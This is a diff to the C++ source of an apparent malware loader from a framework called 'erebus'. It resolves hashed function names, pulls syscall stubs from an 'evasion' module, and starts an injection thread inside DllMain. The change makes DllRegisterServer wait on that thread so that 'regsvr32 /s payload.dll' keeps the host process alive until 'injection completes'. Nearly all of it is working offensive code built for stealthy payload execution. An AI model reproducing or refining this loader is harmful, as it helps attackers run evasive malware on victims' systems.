@@ -282,7 +282,8 @@ VOID entry(void)
 
 #ifdef BUILD_DLL
 
-static BOOL entry_called = FALSE;
+static BOOL   entry_called   = FALSE;
+static HANDLE g_entry_thread = NULL;
 
 static DWORD WINAPI EntryThread(LPVOID)
 {
@@ -301,12 +302,12 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 			HMODULE _hnt_d = erebus::GetModuleHandleC(H("ntdll.dll"));
 			typeNtCreateThreadEx _NtCTE = (typeNtCreateThreadEx)erebus::evasion::GetSyscallStub(H("NtCreateThreadEx"));
 			if (!_NtCTE && _hnt_d) _NtCTE = (typeNtCreateThreadEx)erebus::GetProcAddressC(_hnt_d, H("NtCreateThreadEx"));
-			typeNtClose _NtCl = (typeNtClose)erebus::evasion::GetSyscallStub(H("NtClose"));
-			if (!_NtCl && _hnt_d) _NtCl = (typeNtClose)erebus::GetProcAddressC(_hnt_d, H("NtClose"));
 			HANDLE hThread = NULL;
 			if (_NtCTE) _NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(),
 			                   (PUSER_THREAD_START_ROUTINE)EntryThread, NULL, 0, 0, 0, 0, NULL);
-			if (hThread && _NtCl) _NtCl(hThread);
+			// Keep handle open so DllRegisterServer can wait on it before
+			// the host (regsvr32) tears the process down.
+			g_entry_thread = hThread;
 		}
 		break;
 	case DLL_THREAD_ATTACH:
@@ -317,19 +318,18 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 	return TRUE;
 }
 
+// Invoked by `regsvr32 /s payload.dll`. DllMain already kicked EntryThread on
+// LoadLibrary; block here until injection completes so regsvr32 doesn't tear
+// the host process down mid-flight.
 extern "C" __declspec(dllexport) HRESULT DllRegisterServer(void)
 {
-	if (!entry_called) {
-		entry_called = TRUE;
+	if (g_entry_thread) {
+		WaitForSingleObject(g_entry_thread, 30000);
 		HMODULE _hnt_r = erebus::GetModuleHandleC(H("ntdll.dll"));
-		typeNtCreateThreadEx _NtCTE = (typeNtCreateThreadEx)erebus::evasion::GetSyscallStub(H("NtCreateThreadEx"));
-		if (!_NtCTE && _hnt_r) _NtCTE = (typeNtCreateThreadEx)erebus::GetProcAddressC(_hnt_r, H("NtCreateThreadEx"));
 		typeNtClose _NtCl = (typeNtClose)erebus::evasion::GetSyscallStub(H("NtClose"));
 		if (!_NtCl && _hnt_r) _NtCl = (typeNtClose)erebus::GetProcAddressC(_hnt_r, H("NtClose"));
-		HANDLE hThread = NULL;
-		if (_NtCTE) _NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(),
-		                   (PUSER_THREAD_START_ROUTINE)EntryThread, NULL, 0, 0, 0, 0, NULL);
-		if (hThread && _NtCl) _NtCl(hThread);
+		if (_NtCl) _NtCl(g_entry_thread);
+		g_entry_thread = NULL;
 	}
 	return S_OK;
 }
